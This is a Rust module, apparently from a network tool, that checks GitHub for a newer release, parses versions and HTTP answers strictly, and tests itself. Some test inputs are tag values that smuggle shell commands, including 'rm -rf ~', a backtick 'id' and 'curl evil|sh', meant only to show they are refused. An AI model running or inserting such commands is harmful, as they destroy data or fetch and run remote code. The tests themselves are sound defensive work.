// SPDX-FileCopyrightText: Copyright the Network Scope contributors
// SPDX-License-Identifier: MIT
//! Opt-in update check (roadmap I59). It asks GitHub which release is the latest and says whether
//! that is newer than the running version. **It only notifies.** It never downloads a file, never
//! replaces the program and never runs anything it read; the user gets the release page and the
//! commands that verify a download (checksum, `gh attestation verify`), and does
//! the rest by hand.
//!
//! - **Nothing runs unless asked**: `network-scope-cli update check`, or the desktop setting
//!   "Check for updates on start" (off by default). There is no background timer.
//! - **What is sent**: one HTTPS `GET` of the latest-release endpoint with the headers `Host`,
//!   `User-Agent: network-scope/<version>`, `Accept` and `Connection: close`. No identifier, no
//!   cookie, no scan data. GitHub sees the IP address of the connection, like for any request.
//! - **TLS** is verified against the operating system's certificate store, with the client code of
//!   the HTTPS webhooks (`notify`). Plain `http://` is accepted only for a loopback address, which
//!   is how the tests use an in-process server; the endpoint itself is not user-configurable.
//! - **What is trusted from the answer**: only the release tag, and only after it has been checked
//!   as a strict semantic version. The release page URL and every command shown are built from
//!   the validated version, never copied from the answer, so a hostile or compromised answer
//!   cannot put a link or a command line of its own in front of the user.
//! - **Bounds**: the answer is read up to 1 MiB within a time limit, redirects are not followed.
use crate::notify::{self, Webhook};
use rustls::ClientConfig;
use serde::Deserialize;
use std::{
    cmp::Ordering,
    io::{ErrorKind, Read, Write},
    sync::Arc,
    time::{Duration, Instant},
};

/// The repository the releases belong to.
pub const REPO: &str = "Sparkz400/network-scope";
/// The only endpoint the check talks to.
pub const LATEST_URL: &str = "https://api.github.com/repos/Sparkz400/network-scope/releases/latest";
/// Default time limit for connecting, and per read.
pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(8);
/// Largest answer body accepted (a release with many assets is about 20 KB).
pub const MAX_BODY: usize = 1 << 20;
/// Largest response head (status line and headers) accepted.
const MAX_HEAD: usize = 16 * 1024;
/// Longest version or tag text accepted.
const MAX_VERSION_LEN: usize = 64;
/// The `User-Agent` sent: the program and its version, nothing else.
const USER_AGENT: &str = concat!("network-scope/", env!("CARGO_PKG_VERSION"));

// ---- versions ----------------------------------------------------------------------------

/// One dot-separated part of a pre-release (`rc`, `1`).
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Ident {
    Num(u64),
    Alpha(String),
}
impl Ord for Ident {
    fn cmp(&self, other: &Self) -> Ordering {
        match (self, other) {
            (Self::Num(a), Self::Num(b)) => a.cmp(b),
            (Self::Num(_), Self::Alpha(_)) => Ordering::Less,
            (Self::Alpha(_), Self::Num(_)) => Ordering::Greater,
            (Self::Alpha(a), Self::Alpha(b)) => a.cmp(b),
        }
    }
}
impl PartialOrd for Ident {
    fn partial_cmp(&self, other: &Self) -> Option<Ordering> {
        Some(self.cmp(other))
    }
}

/// A semantic version (semver.org 2.0.0). Build metadata is accepted and ignored, as the
/// specification says for precedence.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Version {
    pub major: u64,
    pub minor: u64,
    pub patch: u64,
    /// Pre-release identifiers; empty for a release.
    pub pre: Vec<Ident>,
}
impl Ord for Version {
    fn cmp(&self, other: &Self) -> Ordering {
        let core =
            (self.major, self.minor, self.patch).cmp(&(other.major, other.minor, other.patch));
        core.then_with(|| match (self.pre.is_empty(), other.pre.is_empty()) {
            (true, true) => Ordering::Equal,
            // A pre-release is lower than the release it leads to.
            (true, false) => Ordering::Greater,
            (false, true) => Ordering::Less,
            (false, false) => self.pre.cmp(&other.pre),
        })
    }
}
impl PartialOrd for Version {
    fn partial_cmp(&self, other: &Self) -> Option<Ordering> {
        Some(self.cmp(other))
    }
}

fn identifier(part: &str) -> bool {
    !part.is_empty() && part.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
}
/// A numeric version part: digits only, no leading zero, small enough for `u64`.
fn number(part: &str) -> Option<u64> {
    let ok = !part.is_empty()
        && part.len() <= 18
        && part.bytes().all(|b| b.is_ascii_digit())
        && (part == "0" || !part.starts_with('0'));
    ok.then(|| part.parse().ok()).flatten()
}

/// Parses a strict semantic version: `MAJOR.MINOR.PATCH`, optionally `-pre.release` and
/// `+build`. No leading `v`, no leading zeros, ASCII only, at most 64 characters. `None` for
/// anything else.
pub fn parse_version(text: &str) -> Option<Version> {
    if text.len() > MAX_VERSION_LEN {
        return None;
    }
    let (rest, build) = match text.split_once('+') {
        Some((rest, build)) => (rest, Some(build)),
        None => (text, None),
    };
    if build.is_some_and(|b| !b.split('.').all(identifier)) {
        return None;
    }
    let (core, pre) = match rest.split_once('-') {
        Some((core, pre)) => (core, Some(pre)),
        None => (rest, None),
    };
    let mut parts = core.split('.');
    let (major, minor, patch) = (
        number(parts.next()?)?,
        number(parts.next()?)?,
        number(parts.next()?)?,
    );
    if parts.next().is_some() {
        return None;
    }
    let pre = match pre {
        None => vec![],
        Some(pre) => pre
            .split('.')
            .map(|part| {
                if !identifier(part) {
                    None
                } else if part.bytes().all(|b| b.is_ascii_digit()) {
                    number(part).map(Ident::Num)
                } else {
                    Some(Ident::Alpha(part.to_string()))
                }
            })
            .collect::<Option<Vec<_>>>()?,
    };
    Some(Version {
        major,
        minor,
        patch,
        pre,
    })
}

// ---- the release -------------------------------------------------------------------------

/// The latest release as far as it is trusted: a tag that passed [`parse_version`].
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Release {
    /// The tag, `v` plus the validated version (`v0.6.0`); only `[0-9A-Za-z.+-]` after the `v`.
    pub tag: String,
    pub version: Version,
    /// A draft, a pre-release by flag, or a pre-release version. Not offered as an update.
    pub prerelease: bool,
}
impl Release {
    /// The version text without the leading `v` (`0.6.0`).
    pub fn version_text(&self) -> &str {
        &self.tag[1..]
    }
    /// The release page, built from the validated tag.
    pub fn url(&self) -> String {
        format!("https://github.com/{REPO}/releases/tag/{}", self.tag)
    }
}

#[derive(Deserialize)]
struct Latest {
    tag_name: String,
    #[serde(default)]
    draft: bool,
    #[serde(default)]
    prerelease: bool,
}

/// A short, printable form of untrusted text for an error message.
fn shown(text: &str) -> String {
    text.chars()
        .take(40)
        .map(|c| if c.is_ascii_graphic() { c } else { '?' })
        .collect()
}

/// Reads the answer of the latest-release endpoint. Only `tag_name`, `draft` and `prerelease`
/// are used; everything else in the answer is ignored.
pub fn parse_latest(body: &[u8]) -> Result<Release, String> {
    let latest: Latest = serde_json::from_slice(body)
        .map_err(|_| "the answer is not a GitHub release".to_string())?;
    let bad = || {
        format!(
            "the latest release has an unexpected tag ({}); expected vMAJOR.MINOR.PATCH",
            shown(&latest.tag_name)
        )
    };
    let version = latest
        .tag_name
        .strip_prefix('v')
        .and_then(parse_version)
        .ok_or_else(bad)?;
    Ok(Release {
        prerelease: latest.draft || latest.prerelease || !version.pre.is_empty(),
        tag: latest.tag_name,
        version,
    })
}

/// How the latest release compares to the running version.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Outcome {
    /// A newer release exists.
    Available(Release),
    UpToDate(Release),
    /// The running version is newer than the latest release (a development build).
    Ahead(Release),
    /// The latest published release is a pre-release or draft; it is not offered.
    Prerelease(Release),
}

/// Compares the running version `current` (`0.5.1`) with `latest`.
pub fn compare(current: &str, latest: Release) -> Result<Outcome, String> {
    let current = parse_version(current).ok_or_else(|| {
        format!(
            "this program's version {} is not a semantic version",
            shown(current)
        )
    })?;
    Ok(if latest.prerelease {
        Outcome::Prerelease(latest)
    } else {
        match latest.version.cmp(&current) {
            Ordering::Greater => Outcome::Available(latest),
            Ordering::Equal => Outcome::UpToDate(latest),
            Ordering::Less => Outcome::Ahead(latest),
        }
    })
}

/// The commands that verify a download of `release`, built from the validated version. The
/// files and commands are the ones of SECURITY.md and docs/src/supply-chain.md.
pub fn verification_text(release: &Release) -> String {
    let v = release.version_text();
    format!(
        "Network Scope never downloads or installs updates. To update, download the file for\n\
         your platform and SHA256SUMS from the release page, and verify it before you run it:\n\
         \n\
         \x20 # checksum (Windows PowerShell: Get-FileHash FILE -Algorithm SHA256)\n\
         \x20 sha256sum -c --ignore-missing SHA256SUMS\n\
         \n\
         \x20 # signed build provenance (GitHub artifact attestation)\n\
         \x20 gh attestation verify network-scope-{v}-linux-x86_64.tar.gz --repo {REPO}\n\
         \n\
         \x20 # the same check offline, with network-scope-{v}.intoto.jsonl from the release\n\
         \x20 gh attestation verify network-scope-{v}-linux-x86_64.tar.gz --repo {REPO} \\\n\
         \x20   --bundle network-scope-{v}.intoto.jsonl\n\
         \n\
         The files are network-scope-{v}-windows-x64.zip, network-scope-{v}-linux-x86_64.tar.gz\n\
         and network-scope-{v}-macos-arm64.tar.gz; use the name of yours in the commands above.\n\
         Details: https://github.com/{REPO}/blob/main/SECURITY.md#verifying-releases"
    )
}

/// What `update check` prints for `outcome`, for the running version `current`.
pub fn describe(outcome: &Outcome, current: &str) -> String {
    match outcome {
        Outcome::Available(r) => format!(
            "Version {} is available (this is {current}).\nRelease page: {}\n\n{}",
            r.version_text(),
            r.url(),
            verification_text(r)
        ),
        Outcome::UpToDate(_) => format!("Network Scope {current} is up to date."),
        Outcome::Ahead(r) => format!(
            "Network Scope {current} is newer than the latest release ({}).",
            r.version_text()
        ),
        Outcome::Prerelease(r) => format!(
            "The latest published release ({}) is a pre-release and is not offered. \
             This is {current}.",
            r.tag
        ),
    }
}

// ---- HTTP --------------------------------------------------------------------------------

/// The status and body of an HTTP response.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Response {
    pub status: u16,
    pub body: Vec<u8>,
}

/// Decodes a chunked body. `Ok(None)`: the terminating chunk has not arrived yet.
fn dechunk(mut data: &[u8]) -> Result<Option<Vec<u8>>, String> {
    let mut out = vec![];
    loop {
        let Some(line_end) = data.windows(2).position(|w| w == b"\r\n") else {
            // No size line yet; a size line is a few hex digits.
            return if data.len() > 32 {
                Err("malformed chunked answer".into())
            } else {
                Ok(None)
            };
        };
        let line = std::str::from_utf8(&data[..line_end]).map_err(|_| "malformed chunk size")?;
        let hex = line.split(';').next().unwrap_or("").trim();
        if hex.is_empty() || hex.len() > 8 {
            return Err("malformed chunk size".into());
        }
        let size = usize::from_str_radix(hex, 16).map_err(|_| "malformed chunk size")?;
        data = &data[line_end + 2..];
        if size == 0 {
            return Ok(Some(out));
        }
        if out.len() + size > MAX_BODY {
            return Err(format!("the answer is larger than {MAX_BODY} bytes"));
        }
        if data.len() < size + 2 {
            return Ok(None);
        }
        out.extend_from_slice(&data[..size]);
        if &data[size..size + 2] != b"\r\n" {
            return Err("malformed chunked answer".into());
        }
        data = &data[size + 2..];
    }
}

/// Parses what has been read of an HTTP/1.x response. `eof`: the peer has closed the
/// connection. `Ok(None)`: more data is needed.
pub(crate) fn parse_response(raw: &[u8], eof: bool) -> Result<Option<Response>, String> {
    // Another protocol (an SSH banner, say) is recognised as soon as the first bytes are in.
    if raw.len() >= 5 && !raw.starts_with(b"HTTP/") {
        return Err(format!(
            "not an HTTP answer: {}",
            shown(&String::from_utf8_lossy(&raw[..raw.len().min(40)]))
        ));
    }
    let Some(head_end) = raw.windows(4).position(|w| w == b"\r\n\r\n") else {
        return if raw.len() > MAX_HEAD {
            Err("the answer's headers are too large".into())
        } else if eof {
            Err("the connection closed before a full answer".into())
        } else {
            Ok(None)
        };
    };
    if head_end > MAX_HEAD {
        return Err("the answer's headers are too large".into());
    }
    let head = String::from_utf8_lossy(&raw[..head_end]);
    let mut lines = head.split("\r\n");
    let status_line = lines.next().unwrap_or("");
    let status: u16 = status_line
        .strip_prefix("HTTP/1.")
        .and_then(|r| r.get(2..5))
        .and_then(|s| s.parse().ok())
        .ok_or_else(|| format!("not an HTTP answer: {}", shown(status_line)))?;
    let (mut length, mut chunked) = (None, false);
    for line in lines {
        let Some((name, value)) = line.split_once(':') else {
            continue;
        };
        let value = value.trim();
        match name.trim().to_ascii_lowercase().as_str() {
            "content-length" => {
                length = Some(
                    value
                        .parse::<usize>()
                        .map_err(|_| "malformed Content-Length".to_string())?,
                );
            }
            "transfer-encoding" => {
                chunked |= value.to_ascii_lowercase().contains("chunked");
            }
            _ => {}
        }
    }
    let body = &raw[head_end + 4..];
    let body = if chunked {
        match dechunk(body)? {
            Some(b) => b,
            None if eof => return Err("the answer was cut off".into()),
            None => return Ok(None),
        }
    } else if let Some(n) = length {
        if n > MAX_BODY {
            return Err(format!("the answer is larger than {MAX_BODY} bytes"));
        }
        if body.len() < n {
            return if eof {
                Err("the answer was cut off".into())
            } else {
                Ok(None)
            };
        }
        body[..n].to_vec()
    } else if eof {
        if body.len() > MAX_BODY {
            return Err(format!("the answer is larger than {MAX_BODY} bytes"));
        }
        body.to_vec()
    } else {
        return Ok(None);
    };
    Ok(Some(Response { status, body }))
}

/// One `GET` of `url`; reads the answer within `timeout` per read and about twice that in total.
fn get(
    url: &Webhook,
    timeout: Duration,
    tls: Option<&Arc<ClientConfig>>,
) -> Result<Response, String> {
    let mut stream = notify::open_stream(url.tls, &url.host, url.port, timeout, tls)?;
    let host = if url.host.contains(':') {
        format!("[{}]", url.host)
    } else {
        url.host.clone()
    };
    let host = if url.port == if url.tls { 443 } else { 80 } {
        host
    } else {
        format!("{host}:{}", url.port)
    };
    let request = format!(
        "GET {} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {USER_AGENT}\r\n\
         Accept: application/vnd.github+json\r\nConnection: close\r\n\r\n",
        url.path
    );
    stream
        .write_all(request.as_bytes())
        .and_then(|()| stream.flush())
        .map_err(|e| e.to_string())?;
    let deadline = Instant::now() + timeout * 2;
    let mut raw: Vec<u8> = vec![];
    let mut buf = [0u8; 8192];
    let response = loop {
        if Instant::now() > deadline {
            return Err("the answer took too long".into());
        }
        let eof = match stream.read(&mut buf) {
            Ok(0) => true,
            Ok(n) => {
                raw.extend_from_slice(&buf[..n]);
                false
            }
            Err(e) if e.kind() == ErrorKind::Interrupted => continue,
            // A TLS server that closes without close_notify.
            Err(e) if e.kind() == ErrorKind::UnexpectedEof => true,
            Err(e) if matches!(e.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock) => {
                return Err("the answer took too long".into());
            }
            Err(e) => return Err(format!("reading the answer failed: {e}")),
        };
        if raw.len() > MAX_HEAD + MAX_BODY + 64 {
            return Err(format!("the answer is larger than {MAX_BODY} bytes"));
        }
        if let Some(r) = parse_response(&raw, eof)? {
            break r;
        }
        if eof {
            return Err("the connection closed before a full answer".into());
        }
    };
    stream.finish();
    Ok(response)
}

fn is_loopback(host: &str) -> bool {
    host.eq_ignore_ascii_case("localhost")
        || host
            .parse::<std::net::IpAddr>()
            .is_ok_and(|ip| ip.is_loopback())
}

/// `check` with the endpoint and TLS setup supplied: tests point it at an in-process server.
pub(crate) fn check_with(
    url: &str,
    current: &str,
    timeout: Duration,
    tls: &dyn Fn() -> Result<Arc<ClientConfig>, String>,
) -> Result<Outcome, String> {
    let url = Webhook::parse(url, "Update")?;
    if !url.tls && !is_loopback(&url.host) {
        return Err("update checks use https".into());
    }
    let config = if url.tls {
        Some(tls().map_err(|e| format!("TLS setup failed: {e}"))?)
    } else {
        None
    };
    let response = get(&url, timeout, config.as_ref())?;
    match response.status {
        200 => compare(current, parse_latest(&response.body)?),
        404 => Err("no release has been published yet (HTTP 404)".into()),
        403 | 429 => Err(format!(
            "GitHub is rate limiting this address (HTTP {}); try again later",
            response.status
        )),
        301 | 302 | 307 | 308 => Err(format!(
            "the release endpoint moved (HTTP {}); see https://github.com/{REPO}/releases",
            response.status
        )),
        other => Err(format!("GitHub answered HTTP {other}")),
    }
}

/// Asks GitHub for the latest release and compares it with `current` (`0.5.1`). One HTTPS
/// request, see the module documentation for what it sends.
pub fn check(current: &str, timeout: Duration) -> Result<Outcome, String> {
    check_at(LATEST_URL, current, timeout)
}

/// [`check`] against another endpoint, for tests (an in-process server on a loopback address).
/// `https://` URLs are verified against the OS certificate store; `http://` is accepted only for
/// a loopback host.
pub fn check_at(url: &str, current: &str, timeout: Duration) -> Result<Outcome, String> {
    check_with(url, current, timeout, &notify::platform_tls_config)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    const FIXTURE: &str = include_str!("../../tests/fixtures/github_release_latest.json");
    const TIMEOUT: Duration = Duration::from_secs(3);

    /// Serves `chunks` (written one after the other, with a short pause) to one connection,
    /// then closes it unless `keep_open`. Returns the port and the request that was read.
    fn serve(chunks: Vec<Vec<u8>>, keep_open: bool) -> (u16, std::thread::JoinHandle<String>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let handle = std::thread::spawn(move || {
            let (mut c, _) = listener.accept().unwrap();
            c.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
            let mut req = vec![];
            let mut buf = [0u8; 1024];
            while !req.windows(4).any(|w| w == b"\r\n\r\n") {
                match c.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => req.extend_from_slice(&buf[..n]),
                }
            }
            for chunk in chunks {
                let _ = c.write_all(&chunk);
                let _ = c.flush();
                std::thread::sleep(Duration::from_millis(20));
            }
            if keep_open {
                std::thread::sleep(Duration::from_millis(600));
            }
            String::from_utf8_lossy(&req).to_string()
        });
        (port, handle)
    }
    fn ok(body: &str) -> Vec<u8> {
        format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{body}",
            body.len()
        )
        .into_bytes()
    }
    fn url(port: u16) -> String {
        format!("http://127.0.0.1:{port}/repos/x/y/releases/latest")
    }
    fn tag_json(tag: &str) -> String {
        format!(r#"{{"tag_name":"{tag}","draft":false,"prerelease":false}}"#)
    }

    #[test]
    fn versions_parse_strictly_and_compare_by_semver_precedence() {
        let v = |s: &str| parse_version(s).unwrap();
        assert_eq!(
            v("1.2.3"),
            Version {
                major: 1,
                minor: 2,
                patch: 3,
                pre: vec![]
            }
        );
        for bad in [
            "",
            "1",
            "1.2",
            "1.2.3.4",
            "01.2.3",
            "1.02.3",
            "1.2.03",
            "v1.2.3",
            "1.2.3-",
            "1.2.3-a..b",
            "1.2.3-01",
            "1.2.3+",
            "1.2.3+a b",
            "1.2.x",
            "1.2.3-é",
            " 1.2.3",
            "1.2.3\n",
            "99999999999999999999.0.0",
            &format!("1.2.3-{}", "a".repeat(70)),
        ] {
            assert_eq!(parse_version(bad), None, "{bad:?}");
        }
        // The ordering example of semver.org section 11.
        let order = [
            "1.0.0-alpha",
            "1.0.0-alpha.1",
            "1.0.0-alpha.beta",
            "1.0.0-beta",
            "1.0.0-beta.2",
            "1.0.0-beta.11",
            "1.0.0-rc.1",
            "1.0.0",
            "1.0.1",
            "1.1.0",
            "2.0.0",
        ];
        for pair in order.windows(2) {
            assert!(v(pair[0]) < v(pair[1]), "{} < {}", pair[0], pair[1]);
        }
        assert!(v("0.10.0") > v("0.9.9"), "numbers, not text");
        assert!(v("0.5.10") > v("0.5.9"));
        assert_eq!(v("1.0.0+abc").cmp(&v("1.0.0+xyz")), Ordering::Equal);
    }

    #[test]
    fn the_fixture_is_a_release_and_only_the_tag_is_used() {
        let r = parse_latest(FIXTURE.as_bytes()).unwrap();
        assert_eq!(r.tag, "v0.6.0");
        assert_eq!(r.version_text(), "0.6.0");
        assert!(!r.prerelease);
        // The page comes from the validated tag, not from the answer's html_url.
        assert_eq!(
            r.url(),
            "https://github.com/Sparkz400/network-scope/releases/tag/v0.6.0"
        );
        assert!(
            FIXTURE.contains("evil.example"),
            "the fixture carries a hostile html_url and body to prove they are ignored"
        );
        assert!(!r.url().contains("evil"));
        let text = describe(&compare("0.5.1", r.clone()).unwrap(), "0.5.1");
        assert!(
            text.starts_with("Version 0.6.0 is available (this is 0.5.1)."),
            "{text}"
        );
        assert!(!text.contains("evil"), "{text}");
        for want in [
            "https://github.com/Sparkz400/network-scope/releases/tag/v0.6.0",
            "sha256sum -c --ignore-missing SHA256SUMS",
            "gh attestation verify network-scope-0.6.0-linux-x86_64.tar.gz --repo Sparkz400/network-scope",
            "--bundle network-scope-0.6.0.intoto.jsonl",
            "network-scope-0.6.0-windows-x64.zip",
        ] {
            assert!(text.contains(want), "{want} in\n{text}");
        }
    }

    #[test]
    fn tags_that_are_not_versions_are_refused() {
        for tag in [
            "0.6.0",
            "v0.6",
            "v0.6.0 ; rm -rf ~",
            "v0.6.0\\n",
            "latest",
            "v1.2.3-rc.01",
            "../../x",
            "v1.2.3`id`",
            "",
        ] {
            let json = serde_json::json!({ "tag_name": tag }).to_string();
            let e = parse_latest(json.as_bytes()).unwrap_err();
            assert!(e.contains("unexpected tag"), "{tag:?}: {e}");
            assert!(!e.contains('\n'), "{e}");
        }
        for body in ["", "[]", "{}", r#"{"tag_name":5}"#, "null", "<html>"] {
            assert!(parse_latest(body.as_bytes()).is_err(), "{body}");
        }
        // A long hostile tag is cut in the message.
        let json = serde_json::json!({ "tag_name": "x".repeat(5000) }).to_string();
        assert!(parse_latest(json.as_bytes()).unwrap_err().len() < 200);
    }

    #[test]
    fn outcomes_follow_the_comparison() {
        let release = |tag: &str, draft: bool, pre: bool| {
            let json = format!(r#"{{"tag_name":"{tag}","draft":{draft},"prerelease":{pre}}}"#);
            parse_latest(json.as_bytes()).unwrap()
        };
        let kind = |cur: &str, r: Release| match compare(cur, r).unwrap() {
            Outcome::Available(_) => "available",
            Outcome::UpToDate(_) => "up to date",
            Outcome::Ahead(_) => "ahead",
            Outcome::Prerelease(_) => "prerelease",
        };
        assert_eq!(kind("0.5.1", release("v0.6.0", false, false)), "available");
        assert_eq!(kind("0.5.1", release("v0.5.2", false, false)), "available");
        assert_eq!(kind("0.5.1", release("v0.5.1", false, false)), "up to date");
        assert_eq!(kind("0.5.1", release("v0.5.0", false, false)), "ahead");
        assert_eq!(kind("0.9.0", release("v0.10.0", false, false)), "available");
        // A pre-release or draft is never offered, whatever its number.
        assert_eq!(kind("0.5.1", release("v9.0.0", false, true)), "prerelease");
        assert_eq!(kind("0.5.1", release("v9.0.0", true, false)), "prerelease");
        assert_eq!(
            kind("0.5.1", release("v9.0.0-rc.1", false, false)),
            "prerelease"
        );
        // A development build of the next version is ahead of the release before it.
        assert_eq!(kind("0.6.0-dev", release("v0.5.1", false, false)), "ahead");
        assert!(compare("not-a-version", release("v0.5.1", false, false)).is_err());
        let r = release("v0.5.1", false, false);
        assert_eq!(
            describe(&Outcome::UpToDate(r.clone()), "0.5.1"),
            "Network Scope 0.5.1 is up to date."
        );
        assert!(describe(&Outcome::Ahead(r), "0.6.0-dev").contains("newer than the latest"));
    }

    #[test]
    fn responses_parse_with_length_chunks_and_close() {
        let parse = |raw: &[u8], eof| parse_response(raw, eof);
        let r = parse(b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello", false)
            .unwrap()
            .unwrap();
        assert_eq!((r.status, r.body.as_slice()), (200, &b"hello"[..]));
        // Incomplete: more is needed, and at EOF that is an error.
        assert_eq!(parse(b"HTTP/1.1 200 OK\r\nContent-Le", false), Ok(None));
        assert_eq!(
            parse(b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhel", false),
            Ok(None)
        );
        assert!(parse(b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhel", true).is_err());
        assert!(parse(b"HTTP/1.1 200 OK\r\nContent-Le", true).is_err());
        // Chunked, with an extension and a trailer.
        let chunked =
            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n3;x=y\r\nabc\r\n2\r\nde\r\n0\r\nX: t\r\n\r\n";
        assert_eq!(parse(chunked, false).unwrap().unwrap().body, b"abcde");
        assert_eq!(parse(&chunked[..chunked.len() - 25], false), Ok(None));
        assert!(parse(&chunked[..chunked.len() - 25], true).is_err());
        // Chunked wins over Content-Length (RFC 9112 6.3).
        let both = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\n0\r\n\r\n";
        assert_eq!(parse(both, false).unwrap().unwrap().body, b"abc");
        // No length: the body ends at EOF.
        assert_eq!(
            parse(b"HTTP/1.0 404 Not Found\r\n\r\nnope", false),
            Ok(None)
        );
        let r = parse(b"HTTP/1.0 404 Not Found\r\n\r\nnope", true)
            .unwrap()
            .unwrap();
        assert_eq!((r.status, r.body.as_slice()), (404, &b"nope"[..]));
        // Garbage.
        for bad in [
            &b"SSH-2.0-x\r\n\r\n"[..],
            b"HTTP/1.1 abc OK\r\n\r\n",
            b"HTTP/1.1 200 OK\r\nContent-Length: -1\r\n\r\n",
            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\nzz\r\n",
            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabcXX0\r\n\r\n",
        ] {
            assert!(
                parse(bad, true).is_err(),
                "{:?}",
                String::from_utf8_lossy(bad)
            );
        }
    }

    #[test]
    fn oversized_and_truncated_answers_are_bounded() {
        // Declared and chunked sizes over the limit, headers with no end.
        let big = format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n",
            MAX_BODY + 1
        );
        assert!(
            parse_response(big.as_bytes(), false)
                .unwrap_err()
                .contains("larger")
        );
        let chunk = format!(
            "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n{:x}\r\n",
            MAX_BODY + 1
        );
        assert!(
            parse_response(chunk.as_bytes(), false)
                .unwrap_err()
                .contains("larger")
        );
        let head = [
            b"HTTP/1.1 200 OK\r\nX: ".as_slice(),
            &vec![b'a'; MAX_HEAD + 10],
        ]
        .concat();
        assert!(
            parse_response(&head, false)
                .unwrap_err()
                .contains("headers")
        );
        // Many small chunks that add up past the limit.
        let mut many = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n".to_vec();
        for _ in 0..(MAX_BODY / 4096 + 2) {
            many.extend(b"1000\r\n");
            many.extend(vec![b'x'; 4096]);
            many.extend(b"\r\n");
        }
        assert!(parse_response(&many, false).unwrap_err().contains("larger"));
        // A body with no declared length that is too big at EOF.
        let mut raw = b"HTTP/1.1 200 OK\r\n\r\n".to_vec();
        raw.extend(vec![b'x'; MAX_BODY + 1]);
        assert!(parse_response(&raw, true).unwrap_err().contains("larger"));
        // Truncated JSON is not a release.
        assert!(parse_latest(&FIXTURE.as_bytes()[..FIXTURE.len() / 2]).is_err());
    }

    #[test]
    fn check_reads_the_latest_release_from_an_in_process_server() {
        let (port, server) = serve(vec![ok(FIXTURE)], false);
        let outcome = check_at(&url(port), "0.5.1", TIMEOUT).unwrap();
        let request = server.join().unwrap();
        let Outcome::Available(release) = outcome else {
            panic!("{outcome:?}");
        };
        assert_eq!(release.tag, "v0.6.0");
        // Exactly these headers and nothing else (no cookie, no identifier).
        let lines: Vec<&str> = request.split("\r\n").filter(|l| !l.is_empty()).collect();
        assert_eq!(
            lines,
            [
                "GET /repos/x/y/releases/latest HTTP/1.1",
                &format!("Host: 127.0.0.1:{port}"),
                concat!("User-Agent: network-scope/", env!("CARGO_PKG_VERSION")),
                "Accept: application/vnd.github+json",
                "Connection: close",
            ]
        );

        // Same release, running version already current, and ahead.
        for (current, want) in [("0.6.0", "up to date"), ("0.7.0", "newer than the latest")] {
            let (port, server) = serve(vec![ok(FIXTURE)], false);
            let text = describe(&check_at(&url(port), current, TIMEOUT).unwrap(), current);
            server.join().unwrap();
            assert!(text.contains(want), "{text}");
        }
    }

    #[test]
    fn check_handles_chunked_and_slowly_arriving_answers() {
        let body = tag_json("v0.5.1");
        let (a, b) = body.split_at(10);
        let raw = format!(
            "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n{:x}\r\n{a}\r\n{:x}\r\n{b}\r\n0\r\n\r\n",
            a.len(),
            b.len()
        )
        .into_bytes();
        // Written byte-pair by byte-pair, and the server keeps the connection open: the client
        // must stop at the end of the answer, not wait for the close.
        let pieces: Vec<Vec<u8>> = raw.chunks(7).map(<[u8]>::to_vec).collect();
        let (port, server) = serve(pieces, true);
        let outcome = check_at(&url(port), "0.5.1", TIMEOUT).unwrap();
        server.join().unwrap();
        assert!(matches!(outcome, Outcome::UpToDate(_)), "{outcome:?}");
    }

    #[test]
    fn check_reports_http_errors_and_bad_answers() {
        let status =
            |code: &str| format!("HTTP/1.1 {code}\r\nContent-Length: 2\r\n\r\n{{}}").into_bytes();
        for (code, want) in [
            ("404 Not Found", "no release has been published"),
            ("403 Forbidden", "rate limiting"),
            ("429 Too Many Requests", "rate limiting"),
            ("301 Moved Permanently", "moved"),
            ("500 Internal Server Error", "HTTP 500"),
        ] {
            let (port, server) = serve(vec![status(code)], false);
            let e = check_at(&url(port), "0.5.1", TIMEOUT).unwrap_err();
            server.join().unwrap();
            assert!(e.contains(want), "{code}: {e}");
        }
        // 200 with something that is not a release, a hostile tag, and not HTTP at all.
        for (raw, want) in [
            (ok("<html>hi</html>"), "not a GitHub release"),
            (ok(&tag_json("v1.0.0; curl evil|sh")), "unexpected tag"),
            (b"SSH-2.0-OpenSSH_9.6\r\n".to_vec(), "not an HTTP answer"),
        ] {
            let (port, server) = serve(vec![raw], false);
            let e = check_at(&url(port), "0.5.1", TIMEOUT).unwrap_err();
            server.join().unwrap();
            assert!(e.contains(want), "{e}");
        }
        // The server closes in the middle of the body.
        let (port, server) = serve(
            vec![b"HTTP/1.1 200 OK\r\nContent-Length: 500\r\n\r\n{\"tag".to_vec()],
            false,
        );
        assert!(
            check_at(&url(port), "0.5.1", TIMEOUT)
                .unwrap_err()
                .contains("cut off")
        );
        server.join().unwrap();
        // Nothing listens, and a server that never answers.
        let port = TcpListener::bind("127.0.0.1:0")
            .unwrap()
            .local_addr()
            .unwrap()
            .port();
        assert!(check_at(&url(port), "0.5.1", Duration::from_millis(500)).is_err());
        let (port, server) = serve(vec![], true);
        let e = check_at(&url(port), "0.5.1", Duration::from_millis(250)).unwrap_err();
        server.join().unwrap();
